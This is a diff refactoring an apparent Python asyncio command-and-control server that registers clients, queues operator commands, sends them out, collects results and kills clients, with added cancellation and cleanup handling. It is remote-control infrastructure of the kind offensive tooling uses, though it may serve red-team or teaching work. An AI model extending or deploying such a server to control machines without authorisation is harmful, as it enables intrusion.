@@ -13,7 +13,7 @@ import logging
 import time
 import uuid
 import argparse
-from typing import Dict
+from typing import Dict, List
 from message import Message
 from models.send_receive_msgs import send_message, receive_message
 from models.client_state import ClientState
@@ -40,39 +40,27 @@ class C2Server:
         self.shutdown = asyncio.Event()   # <-- shared shutdown signal
         self._server: asyncio.base_events.Server | None = None
     
-    async def handle_client(self, reader, writer):
+    async def handle_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
         """
         Implements command recv/exec/result loop
         """
-        client_id = None
-        client_state = None
-        
-        logger.info("handle client")
         try:
-            # Receive registration message
-            msg = await receive_message(reader)
+            msg = await receive_message(reader)  # Receive registration message
             if not msg or msg.type is not MessageType.REGISTER:
                 print(type(msg.type))
                 logger.warning(f"Invalid registration message: {msg.type} of type {type(msg.type)}")
                 writer.close()
                 return
-            
-            client_id = msg.client_id or f"client-{uuid.uuid4().hex[:8]}"
+            client_id = msg.client_id
             client_state = ClientState(client_id, reader, writer)
-            client_state.set_connected()
-            
-            # Register client
             self.clients[client_id] = client_state
             logger.info(f"Client registered: {client_id}")
-            
             # Send acknowledgment
             await send_message(writer, Message.as_ack(client_id))
-            
             # Main client loop
-            logger.info("awaiting client loop")
             await self._client_loop(client_state)
-            logger.info("done awaiting client loop")
-            
+        except asyncio.CancelledError:
+            logger.info("Client handler cancelled")
         except Exception as e:
             logger.error(f"Client handler error: {e}")
 
@@ -80,76 +68,96 @@ class C2Server:
         """
         Main loop for client communication
         """
-        command_receiver = asyncio.create_task(self._command_receiver(client_state))
-        command_executor = asyncio.create_task(self._command_executor(client_state))
-        
         try:
-            await asyncio.gather(
-                command_receiver,
-                command_executor,
-            )
+            tasks = [
+                asyncio.create_task(self._command_receiver(client_state)),
+                asyncio.create_task(self._command_executor(client_state)),
+            ]
+            await asyncio.gather(*tasks, return_exceptions=True)
         except asyncio.CancelledError:
-            pass
+            logger.info("Client loop cancelled")
         finally:
-            command_receiver.cancel()
-            command_executor.cancel()
+            await self._cancel_tasks(tasks)
+            
+    @staticmethod
+    async def _cancel_tasks(tasks: List[asyncio.Task]):
+        try:
+            for task in tasks:
+                if not task.done():
+                    task.cancel()
+        except Exception as e:
+            logger.error(f"Error cancelling tasks: {e}")
 
     async def _command_receiver(self, client_state: ClientState):
         """
         Receive messages from client
         """
-        while not self.shutdown.is_set():
-            try:
+        try:
+            while True:
                 if not client_state.is_connected:
-                    logger.info(f"_command_receiver Client {client_state.client_id} not connected: {client_state.status}")
+                    await self._handle_killed_client(client_state)
                     break
                 msg = await receive_message(client_state.reader)
                 if not msg:
-                    logger.info(f"_command_receiver for Client {client_state.client_id} - no msg")
                     break
-                
+                if self.shutdown.is_set():
+                    break
                 if msg.type is MessageType.RESULT:
                     logger.info(f"Result from {client_state.client_id}: {msg.result[:100]}")
-                    
                     if msg.cmd_id in client_state.pending_results:
-                        del client_state.pending_results[msg.cmd_id]
-                
+                        del client_state.pending_results[msg.cmd_id]   
+                        if client_state.pending_results:
+                            continue  # wait for all results to arrive
+                        client_state.set_killed()
                 else:
                     logger.warning(f"Unknown message type: {msg.type}")
             
-            except Exception as e:
-                logger.error(f"Command receiver error: {e}")
-                break
+        except asyncio.CancelledError:
+            logger.info("Command receiver cancelled")
+        except Exception as e:
+            logger.error(f"Command receiver error: {e}")
     
     async def _command_executor(self, client_state: ClientState):
         """
-        STEP 4: Execute commands queued for this client
+        Execute commands queued for this client
         Uses asyncio.Queue for serialization
         """
-        while not self.shutdown.is_set():
-            try:
+        try:
+            while True:
                 if not client_state.is_connected:
-                    logger.info(f"_command_executor Client {client_state.client_id} not connected: {client_state.status}")
                     break
-                # Get next command from queue (timeout prevents hanging)
                 cmd_data = await client_state.command_queue.get()
-                
+                if self.shutdown.is_set():
+                    break
                 cmd_id = cmd_data.get("cmd_id")
                 command = cmd_data.get("command")
                 
-                # Track pending result
                 client_state.pending_results[cmd_id] = command
-                
-                # Send command to client
                 await send_message(
                     client_state.writer,
                     Message.as_command(cmd_id, command)
                 )
                 logger.info(f"Command sent to {client_state.client_id}: {command}")
             
-            except Exception as e:
-                logger.error(f"Command executor error: {e}")
-                break
+        except asyncio.CancelledError:
+            logger.info("Command executor cancelled")
+        except Exception as e:
+            logger.error(f"Command executor error: {e}")
+
+    async def _handle_killed_client(self, client_state: ClientState) -> None:
+        """Handle killed client connection"""
+        if not client_state.is_killed:
+            return
+        if not client_state.writer or client_state.writer.is_closing():
+            return
+        client_state.writer.close()
+        try:
+            await asyncio.wait_for(client_state.writer.wait_closed(), timeout=1.0)
+        except asyncio.TimeoutError:
+            logger.info(f"Timeout waiting for writer to close reached for {client_state.client_id}")
+        client_state.writer = None
+        client_state.reader = None
+        logger.info(f"Closed writer for killed client {client_state.client_id}")
 
     async def start_server(self):
         """Start the C2 server"""
@@ -158,18 +166,19 @@ class C2Server:
             self.host,
             self.port
         )
-        
         addr = self._server.sockets[0].getsockname()
         logger.info(f"C2 Server listening on {addr[0]}:{addr[1]}")
-        
         async with self._server:
             try:
                 logger.info("Server started")
-                # await self._server.serve_forever()
                 await self.shutdown.wait()
                 logger.info("Server received shutdown event")
             except KeyboardInterrupt:
                 logger.info("Server received Keyboard Interrupt event")
+            except asyncio.CancelledError:
+                logger.info("Server cancelled")
+            except Exception as e:
+                logger.error(f"Server error: {e}")
             finally:
                 await self.stop()
                 logger.info("Server stopped")
@@ -245,7 +254,8 @@ class C2Server:
             return
         self._add_command_to_queue(client_id, CommandType.KILL.value)
         logger.info(f"Kill command sent to {client_id}")
-        self.clients[client_id].set_killed()
+        client_state = self.clients[client_id]
+        client_state.set_killing()
 
     def _add_command_to_queue(self, client_id: str, command: str) -> None:
         cmd_id = str(uuid.uuid4())
@@ -262,9 +272,10 @@ class C2Server:
         """
         loop = asyncio.get_event_loop()
         
-        while not self.shutdown.is_set():
-            try:
-                # Run input in executor to avoid blocking
+        try:
+            while not self.shutdown.is_set():
+                if self.shutdown.is_set():
+                    break
                 cmd = await loop.run_in_executor(None, input, "> ")
                 if not cmd:
                     continue
@@ -296,10 +307,12 @@ exit              - Exit server
                 else:
                     logger.info(f"Unknown command {cmd}. Type 'help'")
             
-            except EOFError:
-                break
-            except Exception as e:
-                logger.error(f"CLI error: {e}")
+        except asyncio.CancelledError:
+            logger.info("CLI cancelled")
+        except KeyboardInterrupt:
+            logger.info("CLI received Keyboard Interrupt event")
+        except Exception as e:
+            logger.error(f"CLI error: {e}")
 
 # ==================== MAIN ====================
 
